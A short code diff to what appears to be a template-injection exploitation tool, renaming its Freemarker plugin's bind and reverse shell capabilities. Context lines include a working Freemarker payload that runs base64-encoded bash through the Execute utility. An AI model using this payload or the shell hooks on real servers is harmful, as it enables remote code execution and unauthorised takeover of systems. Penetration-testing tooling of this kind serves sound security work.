@@ -46,13 +46,13 @@ class Freemarker(Plugin):
             'call': 'render',
             'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}") }"""
         },
-        'tcp_shell' : {
+        'bind_shell' : {
             'call' : 'execute_blind',
-            'tcp_shell': languages.bash_tcp_shell
+            'bind_shell': languages.bash_bind_shell
         },
-        'reverse_tcp_shell' : {
+        'reverse_shell' : {
             'call': 'execute_blind',
-            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
+            'reverse_shell' : languages.bash_reverse_shell
         }
 
     }
@@ -92,8 +92,8 @@ class Freemarker(Plugin):
                 self.set('execute', True)
                 self.set('write', True)
                 self.set('read', True)
-                self.set('tcp_shell', True)
-                self.set('reverse_tcp_shell', True)
+                self.set('bind_shell', True)
+                self.set('reverse_shell', True)
 
                 os = self.execute("""uname""")
                 if os and re.search('^[\w-]+$', os):
@@ -110,5 +110,5 @@ class Freemarker(Plugin):
         # let's assume execute_blind as set.
         self.set('execute_blind', True)
         self.set('write', True)
-        self.set('tcp_shell', True)
-        self.set('reverse_tcp_shell', True)
+        self.set('bind_shell', True)
+        self.set('reverse_shell', True)
